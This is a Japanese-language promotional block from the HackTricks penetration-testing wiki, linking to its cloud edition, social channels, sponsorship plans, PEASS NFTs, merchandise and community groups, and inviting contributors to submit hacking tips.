<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？ [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを手に入れましょう。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手しましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォローしてください。
* [**hacktricks repo**](https://github.com/carlospolop/hacktricks)や[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
